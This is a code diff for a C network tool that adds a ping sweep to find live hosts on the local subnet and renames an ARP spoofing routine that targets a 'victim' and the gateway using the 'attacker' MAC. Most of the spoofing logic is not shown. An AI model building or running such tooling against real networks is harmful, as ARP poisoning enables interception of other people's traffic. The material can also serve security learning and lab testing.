@@ -1,8 +1,56 @@
 #include "core.h"
 
-void* start_arp_spoof_script(void* arp_spoof_script_args) {
+void* start_local_ip_discovery(void* local_ip_discovery_args) {
+    int icmp_sock = get_icmp_socket();
+    LocalIPDiscoveryArgs* args = (LocalIPDiscoveryArgs*)
+        local_ip_discovery_args;
+
+    u32 netmask_hl = get_netmask_hl(args->if_name);
+    u32 netaddr_hl = get_netaddr_hl(args->if_name);
+
+    int n_addrs = get_n_addr_in_net(netmask_hl);
+    for (int i = 0; i < n_addrs; ++i) {
+        u32 addr_hl = get_addr_hl_in_net(netaddr_hl, netmask_hl, i);
+        send_icmp_request(icmp_sock, i, addr_hl, 0);
+    }
+    // u32 addr_hl = get_addr_hl_in_net(netaddr_hl, netmask_hl, 2);
+    // send_icmp_request(icmp_sock, 1, addr_hl, 0);
+
+    // addr_hl = get_addr_hl_in_net(netaddr_hl, netmask_hl, 101);
+    // send_icmp_request(icmp_sock, 1, addr_hl, 0);
+
+    // addr_hl = get_addr_hl_in_net(netaddr_hl, netmask_hl, 1);
+    // send_icmp_request(icmp_sock, 1, addr_hl, 0);
+
+    while (1) {
+        icmp rep = {0};
+        u8 buffer[128] = {};
+        if (receive_socket_reply(icmp_sock, buffer, sizeof(buffer), 1)) {
+            iphdr* ip_header = (iphdr*)buffer;
+            icmp body = {0};
+            memcpy(&body, buffer + (ip_header->ihl * 4), sizeof(icmp));
+            if (body.icmp_type != ICMP_ECHOREPLY) {
+                fprintf(
+                    stderr,
+                    "WARNING: receive_icmp_reply, the reply is received, "
+                    "but its "
+                    "type is not equal to ICMP_ECHOREPLY\n"
+                );
+            } else {
+                uint16_t idx = ntohs(body.icmp_hun.ih_idseq.icd_seq);
+                u32 addr_hl = get_addr_hl_in_net(
+                    netaddr_hl, netmask_hl, idx
+                );
+                in_addr addr = {.s_addr = addr_hl};
+                printf("%s is alive\n", inet_ntoa(addr));
+            }
+        }
+    }
+}
+
+void* start_arp_spoof(void* arp_spoof_args) {
     int arp_sock = get_arp_socket();
-    ARPSpoofScriptArgs* args = (ARPSpoofScriptArgs*)arp_spoof_script_args;
+    ARPSpoofArgs* args = (ARPSpoofArgs*)arp_spoof_args;
     Mac attacker_mac = get_interface_mac(args->if_name);
     u32 gateway_addr_hl = get_gateway_addr_hl(args->if_name);
     u32 victim_addr_hl = inet_addr(args->victim_addr_str);
@@ -53,4 +101,5 @@ void* start_arp_spoof_script(void* arp_spoof_script_args) {
     } while (args->is_terminated == 0);
 
     close(arp_sock);
+    return NULL;
 }
